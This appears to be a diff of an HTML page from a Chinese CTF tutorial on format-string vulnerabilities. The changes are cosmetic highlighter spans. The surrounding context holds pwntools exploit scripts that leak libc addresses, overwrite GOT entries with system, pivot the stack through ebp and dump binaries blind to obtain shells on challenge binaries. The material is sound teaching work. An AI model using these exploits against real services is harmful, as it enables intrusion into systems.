@@ -53,8 +53,8 @@ what<span class=s1>&#39;s the flag</span>
 ─────────────────────────────────────────────────────────────────────────────────────────────────
 </code></pre></div> <p>可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 <a href=https://github.com/scwuaptx/Pwngdb>https://github.com/scwuaptx/Pwngdb</a> 中的 fmtarg 来判断某个参数的偏移。</p> <div class=highlight><pre><span></span><code>gef➤<span class=w>  </span>fmtarg<span class=w> </span>0x00007fffffffdb28
 The<span class=w> </span>index<span class=w> </span>of<span class=w> </span>format<span class=w> </span>argument<span class=w> </span>:<span class=w> </span><span class=m>10</span>
-</code></pre></div> <p>需要注意的是我们必须 break 在 printf 处。</p> <h4 id=_7>利用程序<a class=headerlink href=#_7 title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>需要注意的是我们必须 break 在 printf 处。</p> <h4 id=_7>利用程序<a class=headerlink href=#_7 title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>goodluck</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./goodluck&#39;</span><span class=p>)</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
     <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwn.sniperoj.cn&#39;</span><span class=p>,</span> <span class=mi>30017</span><span class=p>)</span>
@@ -95,8 +95,8 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <span class=w>  </span><span class=p>}</span>
 <span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>printf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dest</span><span class=p>);</span>
 <span class=p>}</span>
-</code></pre></div> <h4 id=_12>漏洞利用思路<a class=headerlink href=#_12 title="Permanent link">&para;</a></h4> <p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p> <ul> <li>绕过密码</li> <li>确定格式化字符串参数偏移</li> <li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li> <li>修改 puts@got 的内容为 system 的地址。</li> <li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li> </ul> <h4 id=_13>漏洞利用程序<a class=headerlink href=#_13 title="Permanent link">&para;</a></h4> <p>如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=n>LibcSearcher</span>
+</code></pre></div> <h4 id=_12>漏洞利用思路<a class=headerlink href=#_12 title="Permanent link">&para;</a></h4> <p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p> <ul> <li>绕过密码</li> <li>确定格式化字符串参数偏移</li> <li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li> <li>修改 puts@got 的内容为 system 的地址。</li> <li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li> </ul> <h4 id=_13>漏洞利用程序<a class=headerlink href=#_13 title="Permanent link">&para;</a></h4> <p>如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=n>LibcSearcher</span>
 <span class=c1>##context.log_level = &#39;debug&#39;</span>
 <span class=n>pwn3</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./pwn3&#39;</span><span class=p>)</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
@@ -105,7 +105,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
     <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn3&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>get</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>get</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;get&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;enter the file name you want to get:&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
@@ -113,7 +113,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
     <span class=k>return</span> <span class=n>data</span>
 
 
-<span class=k>def</span> <span class=nf>put</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>put</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;put&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;please enter the name of the file you want to upload:&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
@@ -121,7 +121,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>show_dir</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>show_dir</span><span class=p>():</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;dir&#39;</span><span class=p>)</span>
 
 
@@ -132,7 +132,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 
 
 <span class=c1>## password</span>
-<span class=k>def</span> <span class=nf>password</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>password</span><span class=p>():</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
 
@@ -240,7 +240,7 @@ Register Success!!
 .text:00000000004008B5                 pop     rsi
 .text:00000000004008B6                 pop     rdx
 .text:00000000004008B7                 retn
-</code></pre></div> <h4 id=_21>利用程序<a class=headerlink href=#_21 title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h4 id=_21>利用程序<a class=headerlink href=#_21 title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
 
@@ -362,8 +362,8 @@ The<span class=w> </span>index<span class=w> </span>of<span class=w> </span>form
 </code></pre></div> <p>payload修改为这样的话，还需要在heap上加入12的偏移。这样保证了0截断出现在泄露之后。</p> <h4 id=ebp>修改ebp<a class=headerlink href=#ebp title="Permanent link">&para;</a></h4> <p>由于我们需要执行 move 指令将 ebp 赋给 esp，并还需要执行 pop ebp 才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 pop ebp 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。</p> <p>上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 6，所以我们可以构造如下的 payload 来进行修改相应的值。</p> <div class=highlight><pre><span></span><code>part1 = (heap_addr - 4) / 2
 part2 = heap_addr - 4 - part1
 payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
-</code></pre></div> <h4 id=shell>获取shell<a class=headerlink href=#shell title="Permanent link">&para;</a></h4> <p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5，退出程序即会执行 ret 指令，就可以获取 shell。</p> <h4 id=_30>利用程序<a class=headerlink href=#_30 title="Permanent link">&para;</a></h4> <p><div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <h4 id=shell>获取shell<a class=headerlink href=#shell title="Permanent link">&para;</a></h4> <p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5，退出程序即会执行 ret 指令，就可以获取 shell。</p> <h4 id=_30>利用程序<a class=headerlink href=#_30 title="Permanent link">&para;</a></h4> <p><div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>contact</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./contacts&#39;</span><span class=p>)</span>
 <span class=c1>##context.log_level = &#39;debug&#39;</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
@@ -372,7 +372,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
     <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./contacts&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>createcontact</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>phone</span><span class=p>,</span> <span class=n>descrip_len</span><span class=p>,</span> <span class=n>description</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>createcontact</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>phone</span><span class=p>,</span> <span class=n>descrip_len</span><span class=p>,</span> <span class=n>description</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Contact info: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
@@ -386,7 +386,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>description</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>printcontact</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>printcontact</span><span class=p>():</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Contacts:&#39;</span><span class=p>)</span>
@@ -438,7 +438,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <span class=c1>##get shell</span>
 <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
 <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</code></pre></div> system出现0截断的情况下，exp如下: <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> system出现0截断的情况下，exp如下: <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&quot;debug&quot;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;x86&quot;</span>
 
@@ -446,7 +446,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <span class=n>binary</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;contacts&quot;</span><span class=p>)</span>
 <span class=n>libc</span><span class=o>=</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
 
-<span class=k>def</span> <span class=nf>createcontact</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>phone</span><span class=p>,</span> <span class=n>descrip_len</span><span class=p>,</span> <span class=n>description</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>createcontact</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>phone</span><span class=p>,</span> <span class=n>descrip_len</span><span class=p>,</span> <span class=n>description</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>=</span><span class=n>io</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
@@ -459,7 +459,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>descrip_len</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;description:</span><span class=se>\n\t\t</span><span class=s1>&#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>description</span><span class=p>)</span>
-<span class=k>def</span> <span class=nf>printcontact</span><span class=p>(</span><span class=n>io</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>printcontact</span><span class=p>(</span><span class=n>io</span><span class=p>):</span>
     <span class=n>sh</span><span class=o>=</span><span class=n>io</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&gt; &#39;</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
@@ -510,11 +510,11 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 %p
 0x7ffd4799beb0
 G�flag<span class=w> </span>is<span class=w> </span>on<span class=w> </span>the<span class=w> </span>stack%<span class=w>                          </span>
-</code></pre></div> <p>告诉我们 flag 在栈上，同时知道了该程序是 64 位的，而且应该有格式化字符串漏洞。</p> <h4 id=_34>利用<a class=headerlink href=#_34 title="Permanent link">&para;</a></h4> <p>那我们就一点一点测试看看</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>告诉我们 flag 在栈上，同时知道了该程序是 64 位的，而且应该有格式化字符串漏洞。</p> <h4 id=_34>利用<a class=headerlink href=#_34 title="Permanent link">&para;</a></h4> <p>那我们就一点一点测试看看</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
 
 
-<span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>leak</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
     <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
     <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
     <span class=n>data</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
@@ -542,14 +542,14 @@ g<span class=o>}</span><span class=se>\x</span><span class=m>00</span><span clas
 aaaaaaaa%p%p%p%p%p%p%p%p%p
 aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
 </code></pre></div> <p>据此，我们可以知道格式化字符串的起始地址偏移为 6。</p> <h4 id=binary>泄露binary<a class=headerlink href=#binary title="Permanent link">&para;</a></h4> <p>由于程序是64位，所以我们从 0x400000 处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入 '\x00' 字符的，，不然没法泄露怎么玩，，除此之后，输出必然是 '\x00' 截断的，这是因为格式化字符串漏洞利用的输出函数均是 '\x00' 截断的。。所以我们可以利用如下的泄露代码。</p> <div class=highlight><pre><span></span><code><span class=c1>##coding=utf8</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=c1>##context.log_level = &#39;debug&#39;</span>
 <span class=n>ip</span> <span class=o>=</span> <span class=s2>&quot;127.0.0.1&quot;</span>
 <span class=n>port</span> <span class=o>=</span> <span class=mi>9999</span>
 
 
-<span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
     <span class=c1># leak addr for three times</span>
     <span class=n>num</span> <span class=o>=</span> <span class=mi>0</span>
     <span class=k>while</span> <span class=n>num</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
@@ -569,7 +569,7 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
             <span class=k>continue</span>
     <span class=k>return</span> <span class=kc>None</span>
 
-<span class=k>def</span> <span class=nf>getbinary</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>getbinary</span><span class=p>():</span>
     <span class=n>addr</span> <span class=o>=</span> <span class=mh>0x400000</span>
     <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;binary&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
     <span class=k>while</span> <span class=n>addr</span> <span class=o>&lt;</span> <span class=mh>0x401000</span><span class=p>:</span>
@@ -605,16 +605,16 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
 <span class=nl>seg000:</span><span class=err>0000000000400634</span><span class=w>                 </span><span class=nf>call</span><span class=w>    </span><span class=no>near</span><span class=w> </span><span class=no>ptr</span><span class=w> </span><span class=no>unk_4004E0</span>
 <span class=nl>seg000:</span><span class=err>0000000000400639</span><span class=w>                 </span><span class=nf>jmp</span><span class=w>     </span><span class=no>short</span><span class=w> </span><span class=no>loc_4005FE</span>
 </code></pre></div> <p>可以基本确定的是 sub_4004C0 为 read 函数，因为读入函数一共有三个参数的话，基本就是 read 了。此外，下面调用的 sub_4004B0 应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个 while 1 的循环，一直在执行。</p> <h4 id=_37>利用思路<a class=headerlink href=#_37 title="Permanent link">&para;</a></h4> <p>分析完上面的之后，我们可以确定如下基本思路</p> <ul> <li>泄露 printf 函数的地址，</li> <li>获取对应 libc 以及 system 函数地址</li> <li>修改 printf 地址为 system 函数地址</li> <li>读入 /bin/sh; 以便于获取 shell</li> </ul> <h4 id=_38>利用程序<a class=headerlink href=#_38 title="Permanent link">&para;</a></h4> <p>程序如下。</p> <div class=highlight><pre><span></span><code><span class=c1>##coding=utf8</span>
-<span class=kn>import</span> <span class=nn>math</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-<span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=n>LibcSearcher</span>
+<span class=kn>import</span><span class=w> </span><span class=nn>math</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>LibcSearcher</span><span class=w> </span><span class=kn>import</span> <span class=n>LibcSearcher</span>
 <span class=c1>##context.log_level = &#39;debug&#39;</span>
 <span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
 <span class=n>ip</span> <span class=o>=</span> <span class=s2>&quot;127.0.0.1&quot;</span>
 <span class=n>port</span> <span class=o>=</span> <span class=mi>9999</span>
 
 
-<span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
     <span class=c1># leak addr for three times</span>
     <span class=n>num</span> <span class=o>=</span> <span class=mi>0</span>
     <span class=k>while</span> <span class=n>num</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
@@ -635,7 +635,7 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
     <span class=k>return</span> <span class=kc>None</span>
 
 
-<span class=k>def</span> <span class=nf>getbinary</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>getbinary</span><span class=p>():</span>
     <span class=n>addr</span> <span class=o>=</span> <span class=mh>0x400000</span>
     <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;binary&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
     <span class=k>while</span> <span class=n>addr</span> <span class=o>&lt;</span> <span class=mh>0x401000</span><span class=p>:</span>
